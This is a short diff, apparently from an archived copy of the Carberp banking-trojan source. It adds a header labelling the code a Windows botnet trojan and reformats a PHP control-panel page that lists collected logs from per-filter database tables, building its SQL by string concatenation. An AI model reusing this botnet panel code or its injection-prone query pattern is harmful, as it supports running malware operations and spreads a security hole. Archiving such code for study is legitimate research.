@@ -1,10 +1,23 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 $smarty->allow_php_tag = true;
 get_function('html_pages');
 
-if(!empty($Cur['str'])){	$filter = new stdClass();
+if(!empty($Cur['str'])){
+	$filter = new stdClass();
 	$filter->str = $Cur['str'];
-	switch($Cur['str']){		case 'me':
+	switch($Cur['str']){
+		case 'me':
         	$filter->name = $lang['fms'];
         	$filter->id = 'me';
 		break;
@@ -146,7 +159,8 @@ if(!empty($sql)) $sql = ' WHERE ' . $sql;
 
 $table_check = $mysqli->table_check('bf_filter_'.$filter->id);
 
-if($table_check->Name != 'bf_filter_'.$filter->id){	print('<hr /><div align="center" style="font-size: 16px; font-weight:bold">'.$lang['tfensdsi'].'</div><hr />');
+if($table_check->Name != 'bf_filter_'.$filter->id){
+	print('<hr /><div align="center" style="font-size: 16px; font-weight:bold">'.$lang['tfensdsi'].'</div><hr />');
 	exit;
 }else{
 	$logs = $mysqli->query('SELECT * FROM bf_filter_' . $filter->id . $sql . ' ORDER by post_date DESC LIMIT ' . ($Cur['page'] == 0 ? 0 : $Cur['page']*$_SESSION['user']->config['cp']['filters']).','.$_SESSION['user']->config['cp']['filters'], null, null, false);
